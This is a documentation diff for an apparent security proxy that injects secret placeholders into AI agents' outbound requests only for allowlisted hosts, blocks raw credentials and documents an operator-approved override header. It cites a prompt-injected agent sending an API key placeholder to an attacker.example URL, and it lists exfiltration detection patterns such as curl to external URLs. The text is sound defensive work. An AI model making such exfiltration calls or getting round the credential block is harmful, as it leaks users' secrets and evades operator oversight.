@@ -355,7 +355,12 @@ prompts happen during setup instead of the first chat-driven paste. Set
 
 The gateway substitutes `{% raw %}{{secret:NAME}}{% endraw %}`
 references at the moment of forwarding — and only if the destination
-is on the per-secret allowlist.
+is on the per-secret allowlist. Placeholders are allowed in URLs,
+headers, and supported request bodies, including query parameters such
+as `?api_key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`. The
+gateway runs manual-credential detection before substitution, so raw
+agent-supplied credentials such as `?api_key=sk-...` are blocked while
+proxy-managed placeholders can still be resolved safely.
 
 ```toml
 # /etc/calciforge/security-proxy.toml
@@ -370,6 +375,25 @@ Without an allowlist entry: substitution is allowed everywhere
 the resolver is even consulted, so a prompt-injected agent calling
 `https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
 fails before the secret value is loaded into memory.
+
+If IronClaw detects a manually supplied credential, Calciforge returns
+a clear agent-readable block page and structured headers:
+
+- `X-Calciforge-Policy: ironclaw.manual_credential`
+- `X-Calciforge-Operator-Approval: required`
+- `X-Calciforge-Override-Supported: operator_scoped`
+- `X-Calciforge-Override-Header: X-Calciforge-Override`
+
+A scoped operator override may be supplied with
+`X-Calciforge-Override: ironclaw.manual_credential:<token>`, where the
+token matches `SECURITY_PROXY_MANUAL_CREDENTIAL_OVERRIDE_TOKEN` on the
+proxy. Calciforge treats all `X-Calciforge-*` request headers as
+control-plane metadata and strips them before forwarding upstream. The
+default is fail-closed: operator approval is required unless the
+deployment explicitly sets
+`manual_credential_override_requires_operator_approval = false` (or the
+environment override
+`SECURITY_PROXY_MANUAL_CREDENTIAL_OVERRIDE_REQUIRES_OPERATOR_APPROVAL=false`).
 
 Outbound bodies are also scanned for *exfiltration-attempt* patterns
 (`POST to https://…`, `send to https://…`, `curl … https://…`,
